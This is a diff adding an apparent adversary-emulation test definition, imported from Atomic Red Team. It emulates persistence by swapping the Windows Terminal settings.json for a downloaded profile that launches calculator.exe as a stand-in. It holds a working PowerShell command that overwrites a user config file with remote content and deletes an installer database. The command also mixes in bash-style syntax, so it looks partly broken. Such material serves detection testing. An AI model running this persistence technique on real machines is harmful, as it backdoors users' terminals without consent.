@@ -1,0 +1,63 @@
+- id: ec5d76ef-82fe-48da-b931-bdb25a62bc65
+  name: Persistence by modifying Windows Terminal profile
+  description: Modify Windows Terminal settings.json file to gain persistence. [Twitter
+    Post](https://twitter.com/nas_bench/status/1550836225652686848)
+  tactic: persistence
+  technique:
+    attack_id: T1547.015
+    name: 'Boot or Logon Autostart Execution: Login Items'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path ~\AppData\Local\Microsoft\WindowsApps\Microsoft.WindowsTerminal_8wekyb3d8bbwe\wt.exe)
+          {exit 0} else {exit 1}; then : ; else $(rm ~\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\StoreEdgeFD\installed.db
+          -ErrorAction Ignore; Write-Output ""; $?) -and $(winget install --id=Microsoft.WindowsTerminal);
+          fi; mv ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
+          ~\AppData\Local\Temp\settings.json; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true"
+          -OutFile "~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json";
+          wt.exe'
+        cleanup: 'mv -Force #{settings_json_tmp} #{settings_json_def}; taskkill /F
+          /IM "#{calculator}" > $null'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1547.015
+  - persistence
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      calculator:
+        description: Test program used to imitate a maliciously called program.
+        type: string
+        default: calculator.exe
+      settings_json_def:
+        description: Default file for Windows Terminal to replace the default profile
+          with a backdoor to call another program.
+        type: path
+        default: ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
+      settings_json_tmp:
+        description: Temp file for Windows Terminal.
+        type: path
+        default: ~\AppData\Local\Temp\settings.json
+      wt_exe:
+        description: Windows Terminal executable.
+        type: path
+        default: ~\AppData\Local\Microsoft\WindowsApps\Microsoft.WindowsTerminal_8wekyb3d8bbwe\wt.exe
+    dependencies:
+    - description: 'Windows Terminal must be installed
+
+        '
+      prereq_command: 'if (Test-Path #{wt_exe}) {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: '$(rm ~\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\StoreEdgeFD\installed.db
+        -ErrorAction Ignore; Write-Output ""; $?) -and $(winget install --id=Microsoft.WindowsTerminal)
+
+        '
+    technique_created: '2021-10-05T21:26:15.081Z'
+    atomic_guid: ec5d76ef-82fe-48da-b931-bdb25a62bc65
+    import_timestamp: '2025-06-24T11:15:05.109971Z'
